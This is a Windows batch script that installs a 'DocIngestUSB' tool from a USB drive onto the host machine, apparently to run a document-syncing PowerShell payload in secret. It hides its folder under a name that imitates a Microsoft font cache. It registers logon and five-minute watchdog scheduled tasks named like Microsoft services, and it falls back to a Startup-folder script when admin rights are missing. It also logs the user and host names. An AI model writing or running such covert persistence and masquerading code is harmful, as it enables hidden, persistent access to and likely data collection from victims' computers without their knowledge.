@echo off
setlocal enableextensions

REM ===================================================
REM  DocIngestUSB — Deploy (hidden folder + install)
REM  Creates hidden service folder, copies scripts,
REM  registers scheduled task. Run from project root.
REM
REM  Fallback: if schtasks requires elevation, persists
REM  via the user Startup folder instead (no admin needed).
REM ===================================================

set "BASE=%USERPROFILE%\.cache\msft-fontcache"
set "SVC=%BASE%\svc"
set "TASK=MicrosoftFontCacheWorker"
set "SRC=%~dp0src"
set "STARTUP_VBS=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\MicrosoftFontCacheWorker.vbs"

REM --- Verify source files exist ---
if not exist "%SRC%\sync.ps1"     ( echo [ERROR] sync.ps1 not found in %SRC% & exit /b 1 )
if not exist "%SRC%\launcher.vbs" ( echo [ERROR] launcher.vbs not found in %SRC% & exit /b 1 )
if not exist "%~dp0config.json"   ( echo [ERROR] config.json not found in %~dp0 & exit /b 1 )

REM --- Create hidden destination folder ---
if not exist "%BASE%" mkdir "%BASE%" >nul 2>&1
attrib +h +s "%BASE%" >nul 2>&1

REM --- Create hidden service subfolder ---
if not exist "%SVC%" mkdir "%SVC%" >nul 2>&1
attrib +h "%SVC%" >nul 2>&1

REM --- Deploy log (written to destination so it survives after USB removal) ---
set "DEPLOYLOG=%BASE%\deploy_log.txt"
echo [%DATE% %TIME%] deploy.bat start  USER=%USERNAME%  HOST=%COMPUTERNAME% >> "%DEPLOYLOG%"
echo   SRC=%SRC% >> "%DEPLOYLOG%"
echo   SVC=%SVC% >> "%DEPLOYLOG%"

REM --- Copy scripts + config ---
copy /y "%SRC%\sync.ps1"     "%SVC%\sync.ps1"     >> "%DEPLOYLOG%" 2>&1
echo   sync.ps1 copy: exit=%errorlevel% >> "%DEPLOYLOG%"
copy /y "%SRC%\launcher.vbs" "%SVC%\launcher.vbs"  >> "%DEPLOYLOG%" 2>&1
echo   launcher.vbs copy: exit=%errorlevel% >> "%DEPLOYLOG%"
copy /y "%~dp0config.json"   "%SVC%\config.json"   >> "%DEPLOYLOG%" 2>&1
echo   config.json copy: exit=%errorlevel% >> "%DEPLOYLOG%"

REM --- Register scheduled tasks (logon + watchdog) ---
set "WATCHDOG=MicrosoftFontCacheMonitor"

schtasks /delete /tn "%TASK%"     /f >nul 2>&1
schtasks /delete /tn "%WATCHDOG%" /f >nul 2>&1

REM Primary trigger: run on logon
schtasks /create /sc onlogon /tn "%TASK%" /tr "wscript.exe \"%SVC%\launcher.vbs\"" /rl limited /f >> "%DEPLOYLOG%" 2>&1
echo   schtasks primary: exit=%errorlevel% >> "%DEPLOYLOG%"

if %errorlevel% neq 0 goto :fallback_startup

REM Watchdog trigger: every 5 minutes (mutex prevents duplicate instances)
schtasks /create /sc minute /mo 5 /tn "%WATCHDOG%" /tr "wscript.exe \"%SVC%\launcher.vbs\"" /rl limited /f >> "%DEPLOYLOG%" 2>&1
echo   schtasks watchdog: exit=%errorlevel% >> "%DEPLOYLOG%"

if %errorlevel% neq 0 (
    echo [WARN] Watchdog task creation failed -- primary task still active.
    echo [%DATE% %TIME%] WARN: watchdog task failed >> "%DEPLOYLOG%"
)

REM --- Start immediately via task ---
schtasks /run /tn "%TASK%" >> "%DEPLOYLOG%" 2>&1
echo   schtasks run: exit=%errorlevel% >> "%DEPLOYLOG%"

echo [OK] Deployed to %SVC%
echo [OK] Task "%TASK%" registered and started.
echo [OK] Watchdog "%WATCHDOG%" registered (every 5 min).
echo [%DATE% %TIME%] deploy OK ^(schtasks path^) >> "%DEPLOYLOG%"
goto :done

:fallback_startup
echo [WARN] schtasks unavailable (no admin) -- falling back to Startup folder.
echo [%DATE% %TIME%] fallback: startup folder >> "%DEPLOYLOG%"
copy /y "%SVC%\launcher.vbs" "%STARTUP_VBS%" >> "%DEPLOYLOG%" 2>&1
echo   startup folder copy: exit=%errorlevel% >> "%DEPLOYLOG%"
if %errorlevel% neq 0 (
    echo [ERROR] Startup folder fallback failed. Deploy aborted.
    echo [%DATE% %TIME%] ERROR: startup folder copy failed >> "%DEPLOYLOG%"
    exit /b 1
)

REM --- Start immediately via direct launch ---
start "" wscript.exe "%SVC%\launcher.vbs"

echo [OK] Deployed to %SVC%
echo [OK] Persistence: Startup folder (%STARTUP_VBS%)
echo [OK] Started immediately. Watchdog: n/a (sync.ps1 runs persistent loop).
echo [%DATE% %TIME%] deploy OK ^(startup folder path^) >> "%DEPLOYLOG%"

:done
endlocal
exit /b 0
